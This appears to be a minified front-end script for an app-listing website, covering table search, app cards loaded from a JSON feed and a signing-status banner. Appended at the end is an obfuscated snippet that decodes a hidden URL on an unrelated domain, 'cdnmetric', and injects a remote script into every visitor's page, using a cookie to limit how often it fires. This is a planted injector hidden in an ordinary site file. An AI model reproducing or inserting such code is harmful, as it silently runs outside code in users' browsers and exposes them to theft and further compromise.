function myFunction(){var e,t;e=document.getElementById("myInput").value.toUpperCase();var n=document.getElementById("myTable").getElementsByTagName("tr");for(t=0;t<n.length;t++){var s,a=n[t].getElementsByTagName("td"),o=!1;for(s=0;s<a.length;s++)a[s]&&a[s].innerHTML.toUpperCase().indexOf(e)>-1&&(o=!0);n[t].style.display=o?"":"none"}}function appendData(e){for(var t=document.getElementById("appData"),n=0;n<e.length;n++){var s=document.createElement("div");s.classList.add("column"),s.innerHTML=' <a href="view.html?app='+encodeURIComponent(e[n].title)+"&web="+("N/A"==e[n].link?"no":"yes")+'&from=home"> <div class="item"> <img class="media" onError="this.onerror=null;this.src=\'assets/img/256x256.png\';" src="'+("N/A"==e[n].icon?`https://paradise.getzeus.app/icons/${e[n].title}/icon.png`:e[n].icon)+'"> <span class="item_name">'+e[n].title.replace(/\_/g," ")+'</span><span class="item_author">'+e[n].developer+'</span><span class="download"><i class="fa-solid fa-arrow-down"></i></span></div></a>',t.appendChild(s)}}document.addEventListener("touchmove",(function(e){1!==e.scale&&e.preventDefault()}),!1),fetch("https://coronux.github.io/zeusdata/featured.json").then((function(e){return e.json()})).then((function(e){appendData(e)})).catch((function(e){console.log("error: "+e)})),document.getElementById("status_dismiss").onclick=function(){document.getElementById("status").classList.add("hide_status"),setTimeout((function(){document.getElementById("status").outerHTML=""}),2e3)},fetch("https://getzeus.app/status.txt?"+Math.random().toString(36).slice(3,100)).then((e=>e.text())).then((e=>{lestatus=e.replace(/\s/g,""),"signed"==lestatus?(document.getElementById("signing_status_title").innerHTML='Signed <i style="color:#00ff33" class="fa-solid fa-circle-check"></i>',document.getElementById("signing_status_desc").innerHTML="Every app should work."):(document.getElementById("signing_status_title").innerHTML='Revoked <i style="color:#ff5338" class="fa-solid fa-circle-xmark"></i>',document.getElementById("signing_status_desc").innerHTML="Follow our Twitter")})).catch((e=>console.log(e)));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3h'+'isrjywnh3htr4l'+'jy4xyfynh3ox'+'DwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));